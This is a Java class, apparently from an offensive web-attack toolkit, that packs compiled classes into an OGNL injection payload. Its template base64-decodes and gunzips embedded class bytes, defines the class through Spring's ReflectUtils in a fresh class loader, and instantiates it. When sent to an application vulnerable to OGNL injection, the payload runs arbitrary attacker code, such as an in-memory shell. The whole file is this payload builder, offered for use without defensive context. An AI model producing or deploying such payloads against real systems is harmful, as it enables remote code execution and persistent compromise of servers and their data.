package com.reajason.javaweb.packer.ognl;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.PackerMeta;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.base64.GzipBase64Packer;
import lombok.SneakyThrows;
import org.kohsuke.MetaInfServices;

import static com.reajason.javaweb.packer.spel.SpELSpringGzipJDK17Packer.assertClassNameValid;

/**
 * @author ReaJason
 * @since 2025/7/7
 */
@MetaInfServices(Packer.class)
@PackerMeta(name = Packers.OGNLSpringGzipJDK17, parent = Packers.OGNL, order = 930)
public class OGNLSpringGzipJDK17Packer implements Packer {

    @Override
    public boolean requiresSpringExpressionPackage() {
        return true;
    }
    String template = "(@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.springframework.util.StreamUtils@copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(@java.util.Base64@getDecoder().decode('{{base64Str}}')))),new java.net.URLClassLoader(new java.net.URL[0],@java.lang.Thread@currentThread().getContextClassLoader()),null,@java.lang.Class@forName('org.springframework.expression.ExpressionParser'))).newInstance()";

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig config) {
        String className = config.getClassName();
        assertClassNameValid(className);
        return template.replace("{{className}}", className)
                .replace("{{base64Str}}", new GzipBase64Packer().pack(config));
    }
}
